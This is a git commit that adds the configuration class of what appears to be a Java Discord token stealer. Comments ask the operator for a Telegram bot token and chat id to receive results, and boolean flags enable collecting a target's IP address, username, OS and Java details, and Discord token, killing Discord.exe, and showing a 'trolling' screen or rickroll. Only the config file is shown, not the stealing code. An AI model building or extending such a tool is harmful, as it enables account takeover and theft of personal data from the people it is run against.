4a415b9a99204c1caedb0c556907526f8ad2a661
dazmaks <65974379+dazmaks@users.noreply.github.com>
2021-01-03 15:02:44 +0300

    first commit

---
+++ org/logger/config.java
@@ -0,0 +1,19 @@
+package org.logger;
+
+public class config {
+    public static final String chatId = "YOUR_ID"; //your telegram id (t.me/userinfobot)
+    public static final String apiToken = "YOUR_TOKEN"; //your bot token (t.me/BotFather)
+
+    public static final boolean osneeded = true; //do you need OS information
+    public static final boolean usernameneeded = true; //do you need to get username of target
+    public static final boolean whereranneeded = true; //do you need to know where target ran logger
+    public static final boolean javainfoneeded = true; //do you need target java info
+
+    public static final boolean ipneeded = true; //do you need target ip
+
+    public static final boolean tokenneeded = true; //do you need target token
+    public static final boolean killprocessneeded = true; //do you need to kill discord process (Discord.exe)
+
+    public static final boolean guineeded = false; //do you need trolling gui
+    public static final boolean rickrollneeded = true; //do you need rick roll
+}
